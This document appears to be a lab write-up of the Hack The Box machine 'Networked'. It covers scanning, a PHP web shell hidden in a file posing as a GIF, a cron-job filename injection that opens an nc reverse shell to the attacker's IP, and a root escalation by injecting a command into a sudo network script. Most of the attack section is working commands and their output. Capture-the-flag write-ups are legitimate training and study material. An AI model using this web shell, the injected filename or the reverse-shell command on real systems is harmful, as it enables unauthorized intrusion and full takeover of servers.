
### Initial access
Nmap 
```
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https

```

Dir scan
```
┌──(kali㉿kali)-[~/HTB/Networked]
└─$ ffuf -u http://$target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.39.81/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Output file      : dirs
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

backup                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 237ms]
[INFO] Adding a new job to the queue: http://10.129.39.81/backup/FUZZ

uploads                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 158ms]
[INFO] Adding a new job to the queue: http://10.129.39.81/uploads/FUZZ

[INFO] Starting queued job on target: http://10.129.39.81/backup/FUZZ

[INFO] Starting queued job on target: http://10.129.39.81/uploads/FUZZ

:: Progress: [62282/62282] :: Job [3/3] :: 335 req/sec :: Duration: [0:02:29] :: Errors: 0 ::

```


Read the php file in backup dir to bypass php
```bash
┌──(kali㉿kali)-[~/oscp/exploit-tool]
└─$ echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.jpg                                          
                                                                  

┌──(kali㉿kali)-[~/oscp/exploit-tool]
└─$ curl -X POST -F "submit=go" -F "myFile=@shell.php.jpg;type=image/gif" 'http://10.129.39.81/upload.php'

┌──(kali㉿kali)-[~/oscp/exploit-tool]
└─$ curl "http://10.129.39.81/uploads/10_10_17_47.php.jpg?cmd=id"                                         
GIF89auid=48(apache) gid=48(apache) groups=48(apache)

```

We got revesrshell
```
┌──(kali㉿kali)-[~/HTB/Networked]
└─$ penelope --oscp-safe --no-log -p 443                                     
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
<|/usr/bin/uname -p 2>/dev/null)";printf $KiRSyZgdeK$qQcBMuTmHr               $qQcBMuTmHr$KiRSy
<cgR;echo "$(id -un)($(id -u))";printf $DWpgmYGcgR$pKPydxOBkx                10.129.39.81 Linux-x86_64 👤 pKPydxOBkx=nOUvxVuYsU DWpgmYGcgR=kGeSbcKyBl;printf $pKPydxOBkx$DWpgm
                                                             apache(48) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
<|/usr/bin/uname -p 2>/dev/null)";printf $PCcRplqpns$KYbqEcWiCw               $KYbqEcWiCw$PCcRp
<GUx;echo "$(id -un)($(id -u))";printf $kYMvYYiGUx$DnpNbXnpsi                10.129.39.81 Linux-x86_64 👤 DnpNbXnpsi=oWekTPzrSB kYMvYYiGUx=FhtVZMaowh;printf $DnpNbXnpsi$kYMvY
                                                             apache(48) 😍 Session ID <2>
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.2$ 


```
### Lateral Movement

After check how to name a file i found
```
${PATH:0:1}bin${PATH:0:1}bash
```

So the payload to trigger cronjob is
```
bash-4.2$ touch 'nc 10.10.17.47 4444 -e ${PATH:0:1}bin${PATH:0:1}sh'
bash-4.2$ pwd
/var/www/html/uploads
bash-4.2$ touch ';nc 10.10.17.47 4444 -e ${PATH:0:1}bin${PATH:0:1}sh' 

```
We get revshell
```
┌──(kali㉿kali)-[~/HTB/Networked]
└─$ penelope --oscp-safe --no-log -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => networked.htb 10.129.39.81 Linux-x86_64 👤 guly(1000) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[guly@networked ~]$ 

```
### Priv escalation

sudo -l
```
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0

```
We have root
```
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
x /bin/bash
interface PROXY_METHOD:
y
interface BROWSER_ONLY:
y
interface BOOTPROTO:
y
[root@networked network-scripts]# id
uid=0(root) gid=0(root) groups=0(root)
[root@networked network-scripts]# 

```